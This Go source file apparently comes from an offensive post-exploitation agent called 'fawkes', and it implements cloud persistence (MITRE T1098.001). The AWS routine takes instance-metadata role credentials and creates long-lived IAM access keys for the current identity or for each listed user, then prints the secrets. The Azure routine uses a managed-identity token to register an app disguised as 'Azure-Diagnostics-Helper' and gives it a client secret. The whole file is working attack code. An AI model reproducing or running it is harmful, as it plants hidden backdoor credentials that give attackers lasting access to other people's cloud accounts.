package commands

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// metadataPost makes an HTTP POST request with a JSON body and returns the response.
// Used for cloud API persistence operations (IAM key creation, Azure app registration).
func metadataPost(url string, timeout time.Duration, headers map[string]string, body string) (string, int) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	var bodyReader io.Reader
	if body != "" {
		bodyReader = bytes.NewReader([]byte(body))
	}

	req, err := http.NewRequestWithContext(ctx, "POST", url, bodyReader)
	if err != nil {
		return "", 0
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	if body != "" {
		req.Header.Set("Content-Type", "application/json")
	}

	client := &http.Client{Timeout: timeout}
	resp, err := client.Do(req)
	if err != nil {
		return "", 0
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(io.LimitReader(resp.Body, metadataMaxSize))
	if err != nil {
		return "", resp.StatusCode
	}
	result := strings.TrimSpace(string(respBody))
	structs.ZeroBytes(respBody)
	return result, resp.StatusCode
}

// --- AWS Persistence: Create IAM Access Key ---
// Uses IMDS credentials to create a long-lived IAM access key pair.
// The new access key persists even when the EC2 instance is terminated.
// MITRE ATT&CK: T1098.001 (Additional Cloud Credentials)

func awsPersist(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== AWS IAM Persistence: Create Access Key ===\n\n")

	// Step 1: Get IMDS credentials
	h := awsHeaders(timeout)
	roles := metadataGet(awsCredsURL, timeout, h)
	if roles == "" {
		sb.WriteString("[-] No IAM role attached — cannot create access keys\n")
		return sb.String()
	}

	role := strings.TrimSpace(strings.Split(roles, "\n")[0])
	sb.WriteString(fmt.Sprintf("[*] IAM Role: %s\n", role))

	credsJSON := metadataGet(awsCredsURL+role, timeout, h)
	if credsJSON == "" {
		sb.WriteString("[-] Could not retrieve IAM credentials\n")
		return sb.String()
	}
	defer structs.ZeroString(&credsJSON)

	var creds struct {
		AccessKeyId     string `json:"AccessKeyId"`
		SecretAccessKey string `json:"SecretAccessKey"`
		Token           string `json:"Token"`
	}
	if err := json.Unmarshal([]byte(credsJSON), &creds); err != nil {
		sb.WriteString("[-] Could not parse IAM credentials\n")
		return sb.String()
	}
	defer func() {
		structs.ZeroString(&creds.AccessKeyId)
		structs.ZeroString(&creds.SecretAccessKey)
		structs.ZeroString(&creds.Token)
	}()

	// Step 2: Get caller identity to determine if we can create access keys
	stsParams := "Action=GetCallerIdentity&Version=2011-06-15"
	stsResp := awsSignedGet(awsSTSEndpoint, stsParams, creds.AccessKeyId, creds.SecretAccessKey, creds.Token, "sts", timeout)
	if stsResp == "" {
		sb.WriteString("[-] STS GetCallerIdentity failed — credentials may be expired\n")
		return sb.String()
	}
	defer structs.ZeroString(&stsResp)

	arn := cloudExtractXMLValue(stsResp, "Arn")
	account := cloudExtractXMLValue(stsResp, "Account")
	sb.WriteString(fmt.Sprintf("[+] Identity: %s (Account: %s)\n\n", arn, account))

	// Step 3: Try to create an access key for the current role's user
	// This works when the role has iam:CreateAccessKey permission
	// The IAM API uses query string parameters for POST requests
	createKeyParams := "Action=CreateAccessKey&Version=2010-05-08"
	createHeaders := map[string]string{
		"X-Amz-Security-Token": creds.Token,
	}
	keyURL := fmt.Sprintf("%s?%s", awsIAMEndpoint, createKeyParams)
	keyResp, statusCode := metadataPost(keyURL, timeout, createHeaders, "")

	if keyResp != "" && statusCode == 200 && !strings.Contains(keyResp, "<Error>") {
		newAccessKey := cloudExtractXMLValue(keyResp, "AccessKeyId")
		newSecretKey := cloudExtractXMLValue(keyResp, "SecretAccessKey")
		userName := cloudExtractXMLValue(keyResp, "UserName")
		defer structs.ZeroString(&keyResp)
		defer structs.ZeroString(&newSecretKey)

		sb.WriteString("[+] SUCCESS: Created new IAM access key!\n")
		sb.WriteString(fmt.Sprintf("    User:       %s\n", userName))
		sb.WriteString(fmt.Sprintf("    AccessKey:  %s\n", newAccessKey))
		sb.WriteString(fmt.Sprintf("    SecretKey:  %s\n", newSecretKey))
		sb.WriteString(fmt.Sprintf("    Account:    %s\n", account))
		sb.WriteString("\n[!] This access key persists independently of the EC2 instance.\n")
		sb.WriteString("[!] Use with: AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY environment variables.\n")
		return sb.String()
	}

	// If direct CreateAccessKey failed, try listing IAM users to find a target
	if keyResp != "" {
		errCode := cloudExtractXMLValue(keyResp, "Code")
		errMsg := cloudExtractXMLValue(keyResp, "Message")
		sb.WriteString(fmt.Sprintf("[*] CreateAccessKey for current identity failed: %s — %s\n", errCode, errMsg))
		structs.ZeroString(&keyResp)
	} else {
		sb.WriteString("[*] CreateAccessKey for current identity failed (no response)\n")
	}

	// Step 4: Try to list IAM users and create a key for an existing user
	sb.WriteString("[*] Attempting to find an IAM user to create access key for...\n\n")

	listUsersParams := "Action=ListUsers&Version=2010-05-08"
	usersResp := awsSignedGet(awsIAMEndpoint, listUsersParams, creds.AccessKeyId, creds.SecretAccessKey, creds.Token, "iam", timeout)
	if usersResp == "" {
		sb.WriteString("[-] Cannot list IAM users (AccessDenied). Persistence requires iam:CreateAccessKey permission.\n")
		return sb.String()
	}
	defer structs.ZeroString(&usersResp)

	userNames := cloudExtractXMLValues(usersResp, "UserName")
	if len(userNames) == 0 {
		sb.WriteString("[-] No IAM users found in account\n")
		return sb.String()
	}

	sb.WriteString(fmt.Sprintf("[+] Found %d IAM users. Attempting access key creation...\n", len(userNames)))

	for _, userName := range userNames {
		createUserKeyParams := fmt.Sprintf("Action=CreateAccessKey&UserName=%s&Version=2010-05-08", userName)
		userKeyURL := fmt.Sprintf("%s?%s", awsIAMEndpoint, createUserKeyParams)
		userKeyResp, userStatus := metadataPost(userKeyURL, timeout, createHeaders, "")

		if userKeyResp != "" && userStatus == 200 && !strings.Contains(userKeyResp, "<Error>") {
			newAccessKey := cloudExtractXMLValue(userKeyResp, "AccessKeyId")
			newSecretKey := cloudExtractXMLValue(userKeyResp, "SecretAccessKey")
			defer structs.ZeroString(&userKeyResp)
			defer structs.ZeroString(&newSecretKey)

			sb.WriteString(fmt.Sprintf("\n[+] SUCCESS: Created access key for user '%s'!\n", userName))
			sb.WriteString(fmt.Sprintf("    AccessKey:  %s\n", newAccessKey))
			sb.WriteString(fmt.Sprintf("    SecretKey:  %s\n", newSecretKey))
			sb.WriteString(fmt.Sprintf("    Account:    %s\n", account))
			sb.WriteString("\n[!] This access key persists independently of the EC2 instance.\n")
			return sb.String()
		}
		if userKeyResp != "" {
			structs.ZeroString(&userKeyResp)
		}
	}

	sb.WriteString("[-] Could not create access key for any IAM user (all denied)\n")
	return sb.String()
}

// --- Azure Persistence: Create App Registration with Client Secret ---
// Uses managed identity token to create an Azure AD app registration with
// a client secret. The client secret provides long-lived credentials for
// accessing Azure resources.
// MITRE ATT&CK: T1098.001 (Additional Cloud Credentials)

func azurePersist(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== Azure AD Persistence: App Registration ===\n\n")

	// Step 1: Get managed identity token scoped to Microsoft Graph
	tokenResp := metadataGet(azureGraphTokenURL, timeout, map[string]string{"Metadata": "true"})
	if tokenResp == "" {
		sb.WriteString("[-] No managed identity available — cannot create app registration\n")
		return sb.String()
	}
	defer structs.ZeroString(&tokenResp)

	var tokenData struct {
		AccessToken string `json:"access_token"`
	}
	if err := json.Unmarshal([]byte(tokenResp), &tokenData); err != nil {
		sb.WriteString("[-] Could not parse managed identity token\n")
		return sb.String()
	}
	defer structs.ZeroString(&tokenData.AccessToken)

	sb.WriteString("[+] Managed Identity Token acquired for Microsoft Graph\n\n")

	authHeaders := map[string]string{
		"Authorization": "Bearer " + tokenData.AccessToken,
	}

	// Step 2: Create an app registration
	appBody := `{"displayName":"Azure-Diagnostics-Helper","signInAudience":"AzureADMyOrg"}`
	appResp, appStatus := metadataPost(azureGraphBase+"applications", timeout, authHeaders, appBody)

	if appStatus != 201 && appStatus != 200 {
		if appResp != "" {
			sb.WriteString(fmt.Sprintf("[-] App registration failed (HTTP %d): %s\n", appStatus, appResp))
			structs.ZeroString(&appResp)
		} else {
			sb.WriteString(fmt.Sprintf("[-] App registration failed (HTTP %d). Requires Application.ReadWrite.All permission.\n", appStatus))
		}
		return sb.String()
	}
	defer structs.ZeroString(&appResp)

	var appData struct {
		ID    string `json:"id"`
		AppID string `json:"appId"`
	}
	if err := json.Unmarshal([]byte(appResp), &appData); err != nil {
		sb.WriteString("[-] Could not parse app registration response\n")
		return sb.String()
	}

	sb.WriteString("[+] App Registration created:\n")
	sb.WriteString(fmt.Sprintf("    Object ID:  %s\n", appData.ID))
	sb.WriteString(fmt.Sprintf("    App ID:     %s\n\n", appData.AppID))

	// Step 3: Add a client secret (password credential)
	secretBody := `{"passwordCredential":{"displayName":"diagnostics-key","endDateTime":"2028-01-01T00:00:00Z"}}`
	secretURL := fmt.Sprintf("%sapplications/%s/addPassword", azureGraphBase, appData.ID)
	secretResp, secretStatus := metadataPost(secretURL, timeout, authHeaders, secretBody)

	if secretStatus != 200 && secretStatus != 201 {
		if secretResp != "" {
			sb.WriteString(fmt.Sprintf("[-] Client secret creation failed (HTTP %d): %s\n", secretStatus, secretResp))
			structs.ZeroString(&secretResp)
		} else {
			sb.WriteString(fmt.Sprintf("[-] Client secret creation failed (HTTP %d)\n", secretStatus))
		}
		sb.WriteString("[!] App registration was created but has no credentials.\n")
		return sb.String()
	}
	defer structs.ZeroString(&secretResp)

	var secretData struct {
		SecretText  string `json:"secretText"`
		KeyID       string `json:"keyId"`
		EndDateTime string `json:"endDateTime"`
	}
	if err := json.Unmarshal([]byte(secretResp), &secretData); err != nil {
		sb.WriteString("[-] Could not parse client secret response\n")
		return sb.String()
	}
	defer structs.ZeroString(&secretData.SecretText)

	// Get tenant ID from instance metadata
	tenantID := ""
	instanceResp := metadataGet(azureInstanceURL, timeout, map[string]string{"Metadata": "true"})
	if instanceResp != "" {
		var instData struct {
			Compute struct {
				SubscriptionId string `json:"subscriptionId"`
			} `json:"compute"`
		}
		if err := json.Unmarshal([]byte(instanceResp), &instData); err == nil {
			tenantID = instData.Compute.SubscriptionId
		}
		structs.ZeroString(&instanceResp)
	}

	sb.WriteString("[+] SUCCESS: Client secret created!\n")
	sb.WriteString(fmt.Sprintf("    App ID:     %s\n", appData.AppID))
	sb.WriteString(fmt.Sprintf("    Secret:     %s\n", secretData.SecretText))
	sb.WriteString(fmt.Sprintf("    Key ID:     %s\n", secretData.KeyID))
	sb.WriteString(fmt.Sprintf("    Expires:    %s\n", secretData.EndDateTime))
	if tenantID != "" {
		sb.WriteString(fmt.Sprintf("    Tenant:     %s\n", tenantID))
	}
	sb.WriteString("\n[!] Authenticate with: az login --service-principal -u <AppID> -p <Secret> --tenant <TenantID>\n")
	sb.WriteString("[!] This credential persists independently of the managed identity.\n")
	sb.WriteString("[!] The app has no roles by default — assign roles via az role assignment create.\n")

	return sb.String()
}
